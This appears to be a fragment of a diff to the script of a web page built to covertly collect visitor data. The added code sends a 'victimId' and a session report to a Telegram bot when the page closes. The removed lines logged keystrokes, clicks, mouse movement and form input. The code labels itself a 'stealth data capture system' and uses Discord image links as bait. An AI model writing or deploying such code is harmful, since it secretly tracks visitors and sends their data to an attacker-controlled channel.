+            setTimeout(sendComprehensiveReport, 2000);
+            
+            // Send final report when page unloads
+            window.addEventListener('beforeunload', function() {
+                if (!reportSent) {
+                    // Send sync request if possible
+                    const data = JSON.stringify(allCollectedData);
+                    navigator.sendBeacon(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, 
+                        JSON.stringify({
+                            chat_id: CONFIG.chatId,
+                            text: `🔚 Session ended - ${allCollectedData.meta?.victimId || 'Unknown'}`
+                        })
+                    );
+                }
+            });
         });
 
-        // Setup session tracking for behavioral data
-        function setupSessionTracking() {
-            // Track mouse movements
-            document.addEventListener('mousemove', (e) => {
-                sessionLog.push({
-                    type: 'mousemove',
-                    x: e.clientX,
-                    y: e.clientY,
-                    timestamp: Date.now()
-                });
-            });
-
-            // Track clicks
-            document.addEventListener('click', (e) => {
-                sessionLog.push({
-                    type: 'click',
-                    x: e.clientX,
-                    y: e.clientY,
-                    target: e.target.tagName,
-                    timestamp: Date.now()
-                });
-            });
-
-            // Track scrolling
-            document.addEventListener('scroll', (e) => {
-                sessionLog.push({
-                    type: 'scroll',
-                    position: window.scrollY,
-                    timestamp: Date.now()
-                });
-            });
-
-            // Track keyboard input
-            document.addEventListener('keydown', (e) => {
-                sessionLog.push({
-                    type: 'keydown',
-                    key: e.key,
-                    target: e.target.tagName,
-                    timestamp: Date.now()
-                });
-            });
-
-            // Track form interactions
-            document.addEventListener('input', (e) => {
-                sessionLog.push({
-                    type: 'input',
-                    target: e.target.tagName,
-                    valueLength: e.target.value.length,
-                    timestamp: Date.now()
-                });
-            });
-        }
-
-        // Image click handler
-        function openImage(imageId) {
-            // Send immediate report if not already sent
-            if (Object.keys(allCollectedData).length === 0) {
-                sendComprehensiveReport();
-            }
-            
-            // Open image
-            const images = {
-                1: 'https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png',
-                2: 'https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png',
-                3: 'https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png'
-            };
-            
-            if (images[imageId]) {
-                window.open(images[imageId], '_blank');
-            }
-        }
-
-        console.log('Comprehensive data capture system loaded');
+        console.log('Stealth data capture system loaded');
     </script>
 </body>
 </html>
